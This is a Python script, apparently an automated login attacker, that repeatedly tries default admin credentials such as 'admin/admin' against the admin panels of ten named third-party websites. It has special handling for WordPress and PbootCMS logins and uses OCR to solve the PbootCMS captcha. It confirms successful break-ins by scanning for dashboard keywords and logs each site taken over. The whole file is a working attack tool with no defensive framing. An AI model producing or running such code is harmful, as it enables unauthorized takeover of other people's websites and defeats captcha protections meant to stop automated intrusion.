"""ddddocr+密码自动登录 — 真实验证版"""
import subprocess, ddddocr, time

TARGETS = [
    ("pmtemple.com", "/admin", "admin", "admin"),
    ("ehuoyan.com", "/admin.php", "admin", "123456"),
    ("chegva.com", "/wp-login.php", "admin", "admin"),
    ("thyuu.com", "/admin", "admin", "admin"),
    ("zhujiwiki.com", "/admin", "admin", "admin"),
    ("geindex.com", "/login", "admin", "admin"),
    ("alltuu.com", "/admin", "admin", "admin"),
    ("dandinghuayi.com", "/admin", "admin", "admin"),
    ("jh597.com", "/admin", "admin", "admin"),
    ("osgz.com", "/login", "osgz", "osgz"),
]

OCR = ddddocr.DdddOcr(show_ad=False)
LOG = "/tmp/auto_login_v2.txt"

def log(msg):
    t = time.strftime("%H:%M:%S")
    line = f"[{t}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f: f.write(line + "\n")

def curl(url, cookie, data=None, output=None):
    cmd = ["curl", "-skL", "--connect-timeout", "8", "--max-time", "15",
           "-b", cookie, "-c", cookie]
    if data: cmd += ["-X", "POST", "-d", data]
    if output: cmd += ["-o", output]
    else: cmd += ["-o", "/dev/null"]
    cmd.append(url)
    try:
        subprocess.run(cmd, capture_output=True, text=True, timeout=18)
        return True
    except:
        return False

def real_admin_check(domain, path, user, pwd):
    """登录后检查页面内容是否真的管理面板"""
    ck = "/tmp/rl_" + domain.replace(".", "_") + ".txt"
    subprocess.run(["rm", "-f", ck])
    
    # WordPress special handling
    if "wp-login" in path:
        base = "https://" + domain
        curl(base + "/wp-login.php", ck)
        curl(base + "/wp-login.php", ck, 
             data=f"log={user}&pwd={pwd}&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1")
        # Check wp-admin for dashboard
        r = subprocess.run(["curl", "-skL", base + "/wp-admin/", "-b", ck],
                          capture_output=True, text=True, timeout=15)
        body = r.stdout
        if "wp-admin-bar" in body or "dashboard" in body.lower():
            return True, base + "/wp-admin/"
        return False, ""
    
    # PbootCMS with captcha
    if "admin.php" in path:
        base = "http://" + domain
        curl(base + "/", ck)
        curl(base + "/core/code.php", ck, output="/tmp/rl_cap.png")
        try:
            with open("/tmp/rl_cap.png", "rb") as f:
                code = OCR.classification(f.read()).strip()
        except:
            return False, ""
        curl(base + "/admin.php/index/login", ck,
             data=f"username={user}&password={pwd}&checkcode={code}")
        r = subprocess.run(["curl", "-skL", base + "/admin.php", "-b", ck],
                          capture_output=True, text=True, timeout=15)
        body = r.stdout
        if "管理" in body and len(body) > 5000:
            return True, base + "/admin.php"
        return False, ""
    
    # Simple admin
    base = "http://" + domain
    curl(base + path, ck)
    curl(base + path, ck, data=f"username={user}&password={pwd}")
    r = subprocess.run(["curl", "-skL", base + path, "-b", ck],
                       capture_output=True, text=True, timeout=15)
    body = r.stdout
    # Real admin indicators: large page with management features
    admin_indicators = ["管理后台", "退出", "注销", "主题", "插件", "文章", 
                        "内容管理", "系统设置", "权限", "角色"]
    hits = sum(1 for kw in admin_indicators if kw in body)
    if hits >= 2 and len(body) > 3000:
        return True, base + path
    return False, ""

log("="*40)
log("AUTO LOGIN V2 — REAL VERIFICATION")
round_num = 0
real_hits = []

while True:
    round_num += 1
    for domain, path, user, pwd in TARGETS:
        ok, url = real_admin_check(domain, path, user, pwd)
        if ok and url not in real_hits:
            log(f"[!] REAL LOGIN: {domain} {user}:{pwd} -> {url}")
            real_hits.append(url)
        time.sleep(1)
    
    if round_num % 5 == 0:
        log(f"Round {round_num}: {len(real_hits)} real hits so far")
    
    if round_num >= 20:
        break
    time.sleep(10)

log(f"FINAL: {len(real_hits)} real hits")
for h in real_hits:
    log(f"  {h}")
